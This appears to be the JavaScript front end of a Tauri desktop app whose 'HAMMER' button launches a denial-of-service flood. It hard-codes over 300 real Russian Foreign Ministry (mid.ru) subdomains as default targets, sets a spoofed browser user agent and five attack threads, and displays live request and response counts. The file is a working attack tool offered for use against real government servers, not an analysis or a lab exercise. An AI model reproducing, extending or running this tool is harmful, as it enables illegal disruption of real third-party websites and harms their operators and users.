const { invoke } = window.__TAURI__.tauri;

const defaultTargets = [
  "web2.mid.ru",
  "www.mid.ru",
  "washington.mid.ru",
  "lithuania.mid.ru",
  "afghanistan.mid.ru",
  "sankt-peterburg.mid.ru",
  "antwerpen.mid.ru",
  "venezuela.mid.ru",
  "qatar.mid.ru",
  "denmark.mid.ru",
  "ghana.mid.ru",
  "chile.mid.ru",
  "greece.mid.ru",
  "romania.mid.ru",
  "iran.mid.ru",
  "moldova.mid.ru",
  "norway.mid.ru",
  "zambia.mid.ru",
  "netherlands.mid.ru",
  "laos.mid.ru",
  "poznan.mid.ru",
  "simferopol.mid.ru",
  "daugavpils.mid.ru",
  "jordan.mid.ru",
  "uae.mid.ru",
  "osh.mid.ru",
  "haifa.mid.ru",
  "congo.mid.ru",
  "frankfurt.mid.ru",
  "hongkong.mid.ru",
  "ireland.mid.ru",
  "ambruslu.mid.ru",
  "ecuador.mid.ru",
  "tokyo.mid.ru",
  "krsk.mid.ru",
  "colombia.mid.ru",
  "azerbaijan.mid.ru",
  "capeverde.mid.ru",
  "montreal.mid.ru",
  "czech.mid.ru",
  "isfahan.mid.ru",
  "irkutsk.mid.ru",
  "latvia.mid.ru",
  "kyrgyz.mid.ru",
  "sri-lanka.mid.ru",
  "uruguay.mid.ru",
  "novosibirsk.mid.ru",
  "barcelona.mid.ru",
  "harbin.mid.ru",
  "sapporo.mid.ru",
  "dubai.mid.ru",
  "cyprus.mid.ru",
  "algerie.mid.ru",
  "khabarovsk.mid.ru",
  "poland.mid.ru",
  "ptcus-4.mid.ru",
  "klaipeda.mid.ru",
  "shenyang.mid.ru",
  "marocco.mid.ru",
  "georgia.mid.ru",
  "mari-el.mid.ru",
  "rca.mid.ru",
  "indonesia.mid.ru",
  "turkey.mid.ru",
  "uzbekistan.mid.ru",
  "istanbul.mid.ru",
  "korea-seoul.mid.ru",
  "nigeria.mid.ru",
  "mauritius.mid.ru",
  "vladivostok.mid.ru",
  "konsaland.mid.ru",
  "australia.mid.ru",
  "uralsk.mid.ru",
  "helsinki.mid.ru",
  "rusconshcm.mid.ru",
  "benin.mid.ru",
  "orenburg.mid.ru",
  "israel.mid.ru",
  "dushanbe.mid.ru",
  "ufa.mid.ru",
  "izhevsk.mid.ru",
  "saloniki.mid.ru",
  "rus-slo.mid.ru",
  "cameroun.mid.ru",
  "newturkey.mid.ru",
  "pna.mid.ru",
  "brest.mid.ru",
  "salzburg.mid.ru",
  "brunei.mid.ru",
  "mw.mid.ru",
  "smolensk.mid.ru",
  "macedonia.mid.ru",
  "hurghada.mid.ru",
  "omsk.mid.ru",
  "petrozavodsk.mid.ru",
  "yemen.mid.ru",
  "smd.mid.ru",
  "nepal.mid.ru",
  "pskov.mid.ru",
  "vrn.mid.ru",
  "spitsbergen.mid.ru",
  "russiaeu.mid.ru",
  "pekin.mid.ru",
  "antalya.mid.ru",
  "senegal.mid.ru",
  "rusmissionvena.mid.ru",
  "tchad.mid.ru",
  "guangzhou.mid.ru",
  "mali.mid.ru",
  "peru.mid.ru",
  "cheboksary.mid.ru",
  "chita.mid.ru",
  "abkhazia.mid.ru",
  "newprofsoyuz.mid.ru",
  "iraq.mid.ru",
  "guinea-bissau.mid.ru",
  "rusemwhk.mid.ru",
  "kazan.mid.ru",
  "uganda.mid.ru",
  "yakutsk.mid.ru",
  "kamchatka.mid.ru",
  "cuba.mid.ru",
  "debrecen.mid.ru",
  "barnaul.mid.ru",
  "mazari-sharif.mid.ru",
  "darkhan.mid.ru",
  "vkiya.mid.ru",
  "rusconsroma.mid.ru",
  "niigata.mid.ru",
  "vladikavkaz.mid.ru",
  "singapore.mid.ru",
  "brno.mid.ru",
  "basrah.mid.ru",
  "villefranche.mid.ru",
  "jeddah.mid.ru",
  "murmansk.mid.ru",
  "belgrad.mid.ru",
  "go.mid.ru",
  "namibia.mid.ru",
  "grodno.mid.ru",
  "libya.mid.ru",
  "rusgencons-erbil.mid.ru",
  "khudzhand.mid.ru",
  "slovenia.mid.ru",
  "philippines.mid.ru",
  "zimbabwe.mid.ru",
  "vietnam.mid.ru",
  "myanmar.mid.ru",
  "sydney.mid.ru",
  "newzealand.mid.ru",
  "newchina.mid.ru",
  "mexico.mid.ru",
  "milan.mid.ru",
  "france.mid.ru",
  "tunisie.mid.ru",
  "thailand.mid.ru",
  "consrio.mid.ru",
  "rostov.mid.ru",
  "cotedivoire.mid.ru",
  "marseille.mid.ru",
  "sweden.mid.ru",
  "alexandria.mid.ru",
  "gabon.mid.ru",
  "bih.mid.ru",
  "rusconsdanang.mid.ru",
  "panama.mid.ru",
  "beijing.mid.ru",
  "brazil.mid.ru",
  "austria.mid.ru",
  "madagascar.mid.ru",
  "india.mid.ru",
  "belarus.mid.ru",
  "rusconhouston.mid.ru",
  "sao-paulo.mid.ru",
  "riyadh.mid.ru",
  "nici.mid.ru",
  "casablanca.mid.ru",
  "trabzon.mid.ru",
  "nicaragua.mid.ru",
  "rusconshanghai.mid.ru",
  "gothenburg.mid.ru",
  "guyana.mid.ru",
  "gdansk.mid.ru",
  "krasnodar.mid.ru",
  "almaata.mid.ru",
  "djibouti.mid.ru",
  "argentina.mid.ru",
  "embrusscambodia.mid.ru",
  "guinea.mid.ru",
  "mumbai.mid.ru",
  "liepaja.mid.ru",
  "albania.mid.ru",
  "roma.mid.ru",
  "portugal.mid.ru",
  "russianembassyza.mid.ru",
  "kaliningrad.mid.ru",
  "malaysia.mid.ru",
  "buryatia.mid.ru",
  "arkhangelsk.mid.ru",
  "bolivia.mid.ru",
  "chondjin.mid.ru",
  "guat.mid.ru",
  "angola.mid.ru",
  "narva.mid.ru",
  "edinburgh.mid.ru",
  "slovakia.mid.ru",
  "ruse.mid.ru",
  "kuwait.mid.ru",
  "belgium.mid.ru",
  "canada.mid.ru",
  "makhachkala.mid.ru",
  "botswana.mid.ru",
  "pakistan.mid.ru",
  "rfsosetia.mid.ru",
  "drc.mid.ru",
  "tanzania.mid.ru",
  "bahrain.mid.ru",
  "burundi.mid.ru",
  "estonia.mid.ru",
  "hungary.mid.ru",
  "armenia.mid.ru",
  "spain.mid.ru",
  "malta.mid.ru",
  "bangladesh.mid.ru",
  "lebanon.mid.ru",
  "gyumri.mid.ru",
  "kolkata.mid.ru",
  "kenya.mid.ru",
  "kirov.mid.ru",
  "phuket.mid.ru",
  "cstorussia2020.mid.ru",
  "jamaica.mid.ru",
  "switzerland.mid.ru",
  "vatican.mid.ru",
  "grozny.mid.ru",
  "ethiopia.mid.ru",
  "seychelles.mid.ru",
  "london.mid.ru",
  "ustkamenogorsk.mid.ru",
  "kirkenes.mid.ru",
  "russembkenya.mid.ru",
  "serbia.mid.ru",
  "oman.mid.ru",
  "bulgaria.mid.ru",
  "strasbourg.mid.ru",
  "newrussembkenya.mid.ru",
  "karachi.mid.ru",
  "palermo.mid.ru",
  "costarica.mid.ru",
  "voronezh.mid.ru",
  "samara.mid.ru",
  "russianunesco.mid.ru",
  "ekaterinburg.mid.ru",
  "croatia.mid.ru",
  "astrakhan.mid.ru",
  "genova.mid.ru",
  "egypt.mid.ru",
  "sakhalin.mid.ru",
  "bonn.mid.ru",
  "saransk.mid.ru",
  "sarajevo.mid.ru",
  "syria.mid.ru",
  "pusan.mid.ru",
  "rusembmali.mid.ru",
  "iceland.mid.ru",
  "zagreb.mid.ru",
  "sochi.mid.ru",
  "eritrea.mid.ru",
  "kmw.mid.ru",
  "mauritanie.mid.ru",
  "russiaun.mid.ru",
  "blag.mid.ru",
  "dprk.mid.ru",
  "rwanda.mid.ru",
  "nnov.mid.ru",
  "newruse.mid.ru",
  "sudan.mid.ru",
  "krakow.mid.ru",
  "newgreat-britain.mid.ru",
  "constanza.mid.ru",
  "germany.mid.ru",
  "constanta.mid.ru",
  "asean.mid.ru",
  "odessa.mid.ru",
  "missiontonato.mid.ru",
  "web164.mid.ru",
  "paraguay.mid.ru",
  "montenegro.mid.ru",
  "hamburg.mid.ru",
  "leipzig.mid.ru",
  "ukraine.mid.ru",
  "lvov.mid.ru",
  "newyork.mid.ru",
  "lviv.mid.ru",
  "viennamission.mid.ru",
  "idd.mid.ru",
  "rusconsmchn.mid.ru",
  "capetown.mid.ru",
  "rusfao.mid.ru",
  "russiaconsulmumbai.mid.ru",
  "karlovy-vary.mid.ru",
  "bsec.mid.ru",
  "vmeste-s-rossiei.mid.ru",
  "centrerusbranly.mid.ru",
  "peterburg.mid.ru",
  "embajadaderusiaenchile.mid.ru",
  "oldsweden.mid.ru",
  "oldguangzhou.mid.ru",
  "archive-helsinki.mid.ru",
  "archive-casablanca.mid.ru",
  "archive-mari-el.mid.ru",
  "chennai.mid.ru",
  "toronto.mid.ru",
  "seattle.mid.ru",
  "osce.mid.ru",
  "mongolia.mid.ru",
  "guinee.mid.ru",
  "coe.mid.ru",
  "kharkov.mid.ru",
  "turkmenistan.mid.ru",
  "geneva.mid.ru",
  "cismission.mid.ru",
  "oldmarseille.mid.ru",
  "sanfrancisco.mid.ru",
  "varna.mid.ru",
  "mozambik.mid.ru",
  "turku.mid.ru",
  "istanbul.turkey.mid.ru",
  "cambodia.mid.ru",
  "cisrussia2017.mid.ru",
  "oldrusconshanghai.mid.ru",
  "archive-czech.mid.ru",
  "archive-khudzhand.mid.ru"
]

const agentDetails = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.91"];

let test_button = document.getElementById('test_button');
let test_text = document.getElementById('test_value');
let hammering_dom = document.getElementById('hammering');
let threadCount_dom = document.getElementById('threadCount');
let clientCount_dom = document.getElementById('clientCount');
let successfulResponses_dom = document.getElementById('successfulResponses')
let forbiddenResponses_dom = document.getElementById('forbiddenResponses')
let notFoundResponses_dom = document.getElementById('notFoundResponses')
let connectionClosedResponses_dom = document.getElementById('connectionClosedResponses')
let requestCount_dom = document.getElementById('requestCount')
let responseCount_dom = document.getElementById('responseCount')
let requestVolume_dom = document.getElementById('requestVolume')
let responseVolume_dom = document.getElementById('responseVolume')
let hammering_button = document.getElementById('start_hammering')

hammering_button.addEventListener("click", toggleHammering)

async function test() {
  test_text.innerHTML = await invoke("test");
}


let threadCount = 0
let clientCount = 0
let successfulResponses = 0
let forbiddenResponses = 0
let notFoundResponses = 0
let connectionClosedResponses = 0
let requestCount = 0
let responseCount = 0
let requestVolume = 0
let responseVolume = 0
let hammering = false
let monitoring = false


async function updateMetrics() {
  invoke('report_metrics').then((metrics) => {
    threadCount = metrics.threadCount
    clientCount = metrics.clientCount
    successfulResponses = metrics.successfulResponses
    forbiddenResponses = metrics.forbiddenResponses
    notFoundResponses = metrics.notFoundResponses
    connectionClosedResponses = metrics.connectionClosedResponses
    requestCount = metrics.requestCount
    responseCount = metrics.responseCount
    requestVolume = metrics.requestVolume
    responseVolume = metrics.responseVolume
    hammering = metrics.hammering
  })
}

function renderMetrics() {
  threadCount_dom.innerHTML = 'Thread Count: ' + threadCount
  clientCount_dom.innerHTML = 'Client Count: ' + clientCount
  successfulResponses_dom.innerHTML = 'Successful Responses: ' + successfulResponses
  forbiddenResponses_dom.innerHTML = 'Forbidden Responses: ' + forbiddenResponses
  notFoundResponses_dom.innerHTML = 'Not Found Responses: ' + notFoundResponses
  connectionClosedResponses_dom.innerHTML = 'Connection Closed Responses: ' + connectionClosedResponses
  requestCount_dom.innerHTML = 'Request Count: ' + requestCount
  responseCount_dom.innerHTML = 'Response Count: ' + responseCount
  requestVolume_dom.innerHTML = 'Request Volume: ' + requestVolume
  responseVolume_dom.innerHTML = 'Response Volume: ' + responseVolume
  hammering_dom.innerHTML = 'Hammering: ' + hammering
}

async function startHammering(){
  hammering = true
  hammering_button.innerHTML = 'HAMMERING...'
  await invoke('start_hammering', { targets: defaultTargets, numberOfThreads: 5, agentDetails: agentDetails, sleepDuration: 1});
}

async function startMonitoring(){
  monitoring = true
  while (monitoring) {
    await updateMetrics()
    renderMetrics()
    await new Promise(r => setTimeout(r, 100));
  }
}

function stopMonitoring(){
  monitoring = false
}

async function stopHammering(){
  await invoke("stop_hammering")
  hammering_button.innerHTML = 'HAMMER'
  hammering = false
}

async function toggleHammering() {
  switch(hammering){
    case false:
      startMonitoring()
      startHammering()
      break;
    case true: 
      stopHammering()
      stopMonitoring()
      break;
  }
}

renderMetrics()